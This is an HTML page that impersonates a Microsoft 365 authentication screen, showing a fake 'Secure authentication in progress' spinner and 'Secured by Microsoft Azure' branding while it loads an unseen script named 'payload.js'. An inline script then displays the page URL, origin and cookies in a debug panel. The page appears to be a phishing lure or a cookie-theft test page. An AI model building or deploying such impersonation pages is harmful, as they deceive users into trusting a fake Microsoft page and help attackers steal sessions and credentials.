<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #1a1a2e;
            padding: 50px;
            border-radius: 16px;
            border: 1px solid #0078d4;
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 60px; margin-bottom: 10px; }
        h1 { color: #0078d4; font-weight: 300; font-size: 28px; }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #1a1a1a;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { 
            color: #888; 
            margin-top: 10px; 
            font-size: 14px;
            min-height: 24px;
            transition: all 0.5s;
        }
        .status.success { color: #00ff88; }
        .status.error { color: #ff0040; }
        .status.info { color: #ffaa00; }
        .footer { margin-top: 20px; font-size: 11px; color: #333; }
        .debug {
            margin-top: 20px;
            padding: 10px;
            background: #0a0a0a;
            border-radius: 8px;
            font-family: monospace;
            font-size: 10px;
            color: #666;
            text-align: left;
            max-height: 100px;
            overflow-y: auto;
            display: none;
        }
        .debug.show { display: block; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">📧</div>
    <h1>Microsoft 365</h1>
    <p style="color: #666; margin: 10px 0;">Secure authentication in progress</p>
    <div class="loader"></div>
    <p class="status" id="status">Connecting to secure server...</p>
    <div class="footer">Secured by Microsoft Azure</div>
    <div class="debug" id="debug"></div>
</div>

<script src="payload.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const status = document.getElementById('status');
    const debug = document.getElementById('debug');
    
    // Show debug info after payload runs
    setTimeout(() => {
        debug.innerHTML = `
            <div>📍 URL: ${window.location.href}</div>
            <div>🍪 Cookies: ${document.cookie || 'None'}</div>
            <div>📡 Origin: ${window.location.origin}</div>
        `;
        debug.className = 'debug show';
    }, 3000);
    
    // UI Updates
    setTimeout(() => {
        status.textContent = 'Verifying your session...';
    }, 1500);
});
</script>

</body>
</html>
